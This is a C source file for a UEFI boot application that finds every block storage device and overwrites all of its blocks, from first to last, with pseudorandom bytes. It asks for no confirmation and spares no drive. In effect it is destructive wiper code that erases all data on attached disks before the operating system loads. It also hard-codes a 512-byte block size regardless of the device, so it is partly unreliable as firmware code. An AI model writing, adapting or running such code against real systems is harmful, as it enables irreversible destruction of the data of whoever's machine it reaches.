#include <stdint.h>
#include <stddef.h>
#include <efi.h>
#include <efilib.h>

#define LCG_A 1664525
#define LCG_C 1013904223
#define LCG_M 4294967296ULL

static SIMPLE_TEXT_OUTPUT_INTERFACE *ConOut = NULL;

UINT64 lcg_seed = 1;

UINT64 lcg_rand() {
    lcg_seed = (lcg_seed * LCG_A + LCG_C) % LCG_M;
    return lcg_seed;
}

EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    ST = SystemTable;
    BS = SystemTable->BootServices;
    ConOut = SystemTable->ConOut;

    EFI_STATUS Status;
    EFI_BLOCK_IO_PROTOCOL *BlockIo;
    EFI_HANDLE *HandleBuffer = NULL;
    UINTN HandleCount = 0;
    UINTN BufferSize = 512;
    UINT8 *Buffer = NULL;

    Status = BS->LocateHandleBuffer(
        ByProtocol,
        &gEfiBlockIoProtocolGuid,
        NULL,
        &HandleCount,
        &HandleBuffer
    );
    if (EFI_ERROR(Status)) {
        return Status;
    }

    Status = BS->AllocatePool(0, BufferSize, (void **)&Buffer);
    if (EFI_ERROR(Status)) {
        BS->FreePool(HandleBuffer);
        return Status;
    }

    for (UINTN i = 0; i < HandleCount; i++) {
        Status = BS->OpenProtocol(
            HandleBuffer[i], 
            &gEfiBlockIoProtocolGuid, 
            (void **)&BlockIo, 
            ImageHandle, 
            NULL, 
            EFI_OPEN_PROTOCOL_BY_HANDLE_PROTOCOL
        );
        
        if (EFI_ERROR(Status)) {
            continue;
        }

        UINTN LastBlock = BlockIo->Media->LastBlock;
        if (BlockIo->Media->MediaPresent == FALSE) {
             BS->CloseProtocol(HandleBuffer[i], &gEfiBlockIoProtocolGuid, ImageHandle, NULL);
             continue;
        }

        for (UINTN Lba = 0; Lba <= LastBlock; Lba++) {
            for (UINTN j = 0; j < BufferSize; j++) {
                Buffer[j] = (UINT8)(lcg_rand() % 256);
            }

            Status = BlockIo->WriteBlocks(BlockIo, BlockIo->Media->MediaId, Lba, BufferSize, Buffer);
            if (EFI_ERROR(Status)) {
                break;
            }

            Status = BlockIo->FlushBlocks(BlockIo);
            if (EFI_ERROR(Status)) {
                break;
            }
        }
        
        BS->CloseProtocol(HandleBuffer[i], &gEfiBlockIoProtocolGuid, ImageHandle, NULL);
    }

    BS->FreePool(Buffer);
    BS->FreePool(HandleBuffer);

    return EFI_SUCCESS;
}
